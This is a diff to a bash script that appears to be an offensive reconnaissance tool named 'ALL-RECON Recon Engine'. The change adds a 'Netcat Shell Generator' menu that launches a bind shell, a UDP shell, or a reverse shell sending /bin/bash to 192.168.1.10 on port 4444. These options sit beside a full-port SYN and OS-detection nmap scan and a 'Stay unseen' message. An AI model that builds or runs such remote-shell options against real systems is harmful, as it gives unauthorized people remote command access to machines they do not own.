@@ -69,8 +69,9 @@ echo ""
 echo "Select Scan Type:"
 echo "1. Local Network Scan (Ping Sweep + Port Scan)"
 echo "2. Scan Specific Host (Website IP or Domain)"
-echo "3. Exit / Cancel"
-read -p "Enter choice [1/2/3]: " choice
+echo "3. Netcat Shell Generator (bind / reverse shell)"
+echo "4. Exit / Cancel"
+read -p "Enter choice [1/2/3/4]: " choice
 echo ""
 
 # --- SCAN OPTIONS -------------------------------------
@@ -110,8 +111,30 @@ elif [[ "$choice" == "2" ]]; then
     nmap -sS -O --osscan-guess --osscan-limit --max-os-tries 1 -T4 -Pn -p- $target | tee "scan_${target//[^a-zA-Z0-9]/_}.txt"
 
 elif [[ "$choice" == "3" ]]; then
-    # --- OPTION 3: EXIT -----------------------------------
-    echo -e "$(tput bold)[*] Exiting ALL-RECON Recon Engine. Stay unseen. [SAFE]$(tput sgr0)"
+    echo ""
+    echo "[] Netcat Shell Generator"
+    echo "1. Bind shell example"
+    echo "2. Reverse shell example"
+    echo "3. UDP shell example"
+    read -p "Select netcat shell template [1/2/3]: " netcat_choice
+    case "$netcat_choice" in
+        1)
+            bash modules/netcat_shells.sh bind 4444 /bin/bash
+            ;;
+        2)
+            bash modules/netcat_shells.sh reverse 192.168.1.10 4444 /bin/bash
+            ;;
+        3)
+            bash modules/netcat_shells.sh udp 4444
+            ;;
+        *)
+            echo "[ERROR] Invalid netcat choice."
+            ;;
+    esac
+
+elif [[ "$choice" == "4" ]]; then
+    # --- OPTION 4: EXIT -----------------------------------
+    echo -e "$(tput bold)[*] Exiting ALL-RECON Recon Engine. Stay unseen.$(tput sgr0)"
     exit 0
 
 else
